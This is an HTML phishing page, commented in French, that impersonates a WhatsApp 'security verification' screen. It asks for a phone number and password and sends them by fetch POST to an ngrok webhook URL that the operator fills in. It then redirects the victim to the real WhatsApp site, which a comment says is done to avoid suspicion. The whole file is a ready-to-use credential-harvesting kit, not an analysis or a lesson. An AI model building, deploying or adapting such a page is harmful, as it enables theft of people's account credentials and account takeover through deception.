<!DOCTYPE html>
<html>
<body style="font-family:sans-serif;text-align:center;background:#f0f2f5;padding:50px;">
    <div style="background:white;padding:20px;border-radius:10px;max-width:300px;margin:auto;box-shadow:0 0 10px rgba(0,0,0,0.1)">
        <h2>WhatsApp</h2>
        <p style="color:red">Vérification de sécurité requise</p>
        <form id="monFormulaire">
            <input type="text" id="tel" placeholder="Numéro de téléphone" style="width:90%;padding:10px;margin:10px" required><br>
            <input type="password" id="pass" placeholder="Mot de passe" style="width:90%;padding:10px;margin:10px" required><br>
            <button type="submit" style="background:#25d366;color:white;border:none;padding:10px;width:95%;cursor:pointer">VALIDER</button>
        </form>
    </div>

    <script>
    document.getElementById('monFormulaire').onsubmit = async (e) => {
        e.preventDefault();
        const num = document.getElementById('tel').value;
        const mdp = document.getElementById('pass').value;
        
        // C'EST ICI QUE TU METS TON LIEN NGROK
        const webhookUrl = "https://L'URL_DE_TON_NGROK.ngrok-free.app/webhook";

        const data = new URLSearchParams();
        data.append('phone', num);
        data.append('password', mdp);

        try {
            // On envoie les infos vers ton PC
            await fetch(webhookUrl, { method: 'POST', body: data, mode: 'no-cors' });
            // Une fois envoyé, on redirige vers le vrai WhatsApp pour pas de soupçons
            window.location.href = "https://www.whatsapp.com";
        } catch (error) {
            window.location.href = "https://www.whatsapp.com";
        }
    };
    </script>
</body>
</html>
